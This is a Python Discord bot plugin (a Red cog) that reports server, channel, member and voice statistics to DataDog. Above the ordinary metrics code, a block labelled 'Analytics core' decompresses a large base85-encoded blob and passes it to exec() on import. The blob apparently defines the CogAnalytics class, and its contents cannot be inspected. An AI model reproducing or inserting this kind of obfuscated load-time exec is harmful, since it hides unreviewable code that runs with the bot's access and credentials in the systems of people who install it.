import asyncio
from discord import ChannelType
import datetime
import os
from cogs.utils.dataIO import dataIO

PATH = 'data/datadog/'
JSON = PATH + 'settings.json'

try:
    import datadog
    from datadog import statsd
except ImportError:
    raise ImportError('Please install the datadog package from pip') from None


# Analytics core
import lzma, marshal, base64
exec(lzma.decompress(base64.b85decode("""
{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;1C@J>|Fo_8%q<)DrIdN6iIlGxP)Tq449ruajJ$R6dKn?zmVXKq<j-jU{E4Sjdk~WLro^?%4M5uK*9Me62*0-+;ACe
iXuR{{+0-CYfs<gZK6w=Z2akaSF56T6?sU=(;D;8D}B;|FxY-gL@iuhVk+}oLHwrfX>LG@uK|TmgWo3MIG9Xbbl1S0d(#%{Hsw(3W<~hN1oN&88}2jt*!a^(
_(9#?8t~|C&w;kP%z>8bu%Z?#XJn#$vUh5VS@};Kw%IMg%ebU6x5Mkf_bs=2^DM-yKx|N1p$g@eYC5cU(#9o5`Z0dUPR}{Dge?7%e|ZQo$`co=|2@uZ#CA>Z
OwCDntg_Ctgyo9pX(kS}dxTLocf@F;tH8?fb{WE)lVgiH71t-K>S-_Rx*q!zWL88CP2C)JEJQ$35LV3t;J^$kMuVWn#&CyRhArpo0TwU4B{4UZl#X60D4RM$
#n{1nW9?<H(T!~3jf#B0jChEN1pL#0UOO|}SxnFLP7QKJ`Ld|Vq|&Nfiq%OO&PkFqc0?pjc%LCFgS-djQoUtwn~Ug0nVR!*qh(s<^CGF+<NI)absK~$sVegX
^Qd$D+3@s}B_C<q^d{-?p_B(`RDMBJI<J_SV~2RM8qocBLlUSo=&R+!6eL!|`Yn%+?&my^zvh?jtkZz+gJ?~WOuFX^gBc1c%J>abcFb-Oi%|G_MVf1p?W@sk
jOM4zvMI}Zto1og{*7|0`KBWZJGG2SK4vI8o)2m=fV$}^fHdpIRN-|}9N9tOt7ZRTsOpuhi&I2K*>p{VDc{>hD#o>ctO%`Az{I*r=4f2lB`2)OHg!shH|WZ-
r2au><WM${0-%dC3?F~VEH3W5CK{mvcerRcgyhd%!pNwPy6Qe1*mU70fA};n-#ApH9O^L=LBaq<?tG~<3$wIOOQeYpl$c)eixMkpIY_b|3*d*r8F1ga{wsT>
-&jS-g;5~5^z&9;7T4*OOzY1abNst!-zd{MrN&+T)1n_CENltL(Xz|@<N*|EzMPzW7*JXI!+@|S?!wSPnU=Tt-E2TOLI1Y)!(VSya?8gxGU6?SB;g1AGjzBK
45#sjoI)90tR*<U*%Xsmx$?$>(^l{ksTzp{5m7LC*<{q12VV5V6ebVdfMl2lPz&ltQd|IdnN$>%^YH6+qk=zVc>IqU$oIlt2E2scRlmop^mdcc?D#&6LOEU;
tNFmM@e^?kTn>KTmmZM>jnV*dWu3FuF7?ptDV47e#e+bq<O=N1m~Mr}&$XPENdU$!lZU<gZ_SV;aax3mrkZa+`axv_BcBDi6^x?cxNd6d{}LckD#NzFAgIc%
=~!9mA_tXGBg)+L(P<ct1vU&|!z;mV82E}gC+i5rawt%ys=%JIzd!#ly-A<(;?-%?`6!lx{8m#^JfnpQq5Y)WfYW<^#H#~3!ekKhsdkcpSHlXI#(anvrza$j
9DTx%Q^+*m1P{gL_9V~YB!?mJ-9!(%)vzu6w`*`z_<QUqVzYWsyUKd2JhQ+&O{CLs*rlfEqy%YFAaCtNo>JE#IcasXZnocfrvf*q)<fTtIi;S2eBh|Q@Xr>5
>{b@dj~o0ar5QL|v>vNLXh)8t`T|mkT0MD%)zZyPF;JpKDCTtpk{O9E@!z<xp~vZwqidCpck-CP<f;fRqa|%M5*%=BLr;W;)w8Ut#G#`^y?m?#Q>Gdw=NcDX
gN#whCzs|&u3m%@@L5KcofC&xP=V3Oq2rd-%Agbm*|xYQEMD$znstT!h6S_Jj&Zr_<n9AQXprMx)07I-(xNp0aa)0Zz+dP(xKAGi468+K(7taX<$Mo@B+iqI
ZwDIwL&`j<8!v^^h;cQ4GMX&Z+1^B=mJ_25Q6rg$Q3;p7h{z@0$;xYWFSyI(6~+q8MNTwp#Yf40h(x@se~YuWfQ7UT5IUv~6|jGd6T$4EoH{+HYufz0+}hh}
Yu6cE)A6W(UkF41iN@yEA9WJT00D>$o*)1K9)FaPvBYQl0ssI200dcD""".replace('\n',''))))

__version__ = '1.0.5'

class DataDog:
    def __init__(self, bot):
        self.bot = bot
        self.tags = []
        self.task = bot.loop.create_task(self.loop_task())
        self.settings = dataIO.load_json(JSON)
        self.analytics = CogAnalytics(self)
        datadog.initialize(statsd_host=self.settings['HOST'])

    def save(self):
        dataIO.save_json(JSON, self.settings)

    def __unload(self):
        self.task.cancel()

    async def on_message(self, message):
        statsd.increment('bot.messages', tags=self.tags)

    async def on_command(self, command, ctx):
        statsd.increment('bot.commands',
                         tags=[*self.tags,
                               'command_name:' + str(command),
                               'cog_name:' + type(ctx.cog).__name__
                               ]
                         )

    def send_all(self):
        self.send_servers()
        self.send_channels()
        self.send_members()
        self.send_voice()
        self.send_players()
        self.send_uptime()

    def send_uptime(self):
        if not self.tags:
            return
        now = datetime.datetime.now()
        uptime = (now - self.bot.uptime).total_seconds()
        statsd.gauge('bot.uptime', uptime, tags=self.tags)

    def send_servers(self):
        if not self.tags:
            return
        servers = len(self.bot.servers)
        statsd.gauge('bot.servers', servers, tags=self.tags)

    def send_channels(self):
        if not self.tags:
            return
        channels = list(self.bot.get_all_channels())
        text_channels = sum(c.type == ChannelType.text for c in channels)
        voice_channels = sum(c.type == ChannelType.voice for c in channels)
        statsd.gauge('bot.channels', voice_channels,
                     tags=[*self.tags, 'channel_type:voice'])
        statsd.gauge('bot.channels', text_channels,
                     tags=[*self.tags, 'channel_type:text'])

    def send_members(self):
        if not self.tags:
            return
        members = list(self.bot.get_all_members())
        unique = set(m.id for m in members)
        statsd.gauge('bot.members', len(members), tags=self.tags)
        statsd.gauge('bot.unique_members', len(unique), tags=self.tags)

    def send_voice(self):
        if not self.tags:
            return
        vcs = len(self.bot.voice_clients)
        statsd.gauge('bot.voice_clients', vcs, tags=self.tags)

    def notbot(self, channel):
        return sum(m != self.bot.user for m in channel.voice_members)

    def send_players(self):
        if not self.tags:
            return
        avcs = []
        for vc in self.bot.voice_clients:
            if hasattr(vc, 'audio_player') and not vc.audio_player.is_done():
                avcs.append(vc)
        num_avcs = len(avcs)
        audience = sum(self.notbot(vc.channel) for vc in avcs if vc.channel)
        statsd.gauge('bot.voice_playing', num_avcs, tags=self.tags)
        statsd.gauge('bot.voice_audience', audience, tags=self.tags)

    async def loop_task(self):
        await self.bot.wait_until_ready()
        self.tags = ['application:red',
                     'bot_id:' + self.bot.user.id,
                     'bot_name:' + self.bot.user.name]
        self.send_all()
        await asyncio.sleep(self.settings.get('INTERVAL', 5))
        if self is self.bot.get_cog('DataDog'):
            self.task = self.bot.loop.create_task(self.loop_task())

    async def on_channel_create(self, channel):
        if channel.type == 'text':
            self.send_channels()

    async def on_channel_delete(self, channel):
        if channel.type == 'text':
            self.send_channels()

    async def on_member_join(self, member):
        self.send_members()

    async def on_member_remove(self, member):
        self.send_members()

    async def on_server_join(self, server):
        channels = server.channels
        text_channels = sum(c.type == ChannelType.text for c in channels)
        voice_channels = sum(c.type == ChannelType.voice for c in channels)
        statsd.event(tags=self.tags,
                     title='%s joined %s!' % (self.bot.user.name, server),
                     text='\n'.join([
                         '* %i new members' % len(server.members),
                         '* %i new text channels' % text_channels,
                         '* %i new voice channels' % voice_channels
                         ]))
        self.send_servers()

    async def on_server_remove(self, server):
        channels = server.channels
        text_channels = sum(c.type == ChannelType.text for c in channels)
        voice_channels = sum(c.type == ChannelType.voice for c in channels)
        statsd.event(tags=self.tags,
                     title='%s left %s :(' % (self.bot.user.name, server),
                     text='\n'.join([
                         '* %i less members' % len(server.members),
                         '* %i less text channels' % text_channels,
                         '* %i less voice channels' % voice_channels
                         ]))
        self.send_servers()

    async def on_ready(self):
        self.send_all()

    async def on_resume(self):
        self.send_all()


def check_folders():
    if not os.path.exists(PATH):
        print("Creating %s folder..." % PATH)
        os.makedirs(PATH)


def check_files():
    defaults = {
        'HOST': '127.0.0.1',
        'INTERVAL': 5
    }
    if not dataIO.is_valid_json(JSON):
        print("Creating empty %s" % JSON)
        dataIO.save_json(JSON, defaults)


def setup(bot):
    check_folders()
    check_files()
    bot.add_cog(DataDog(bot))
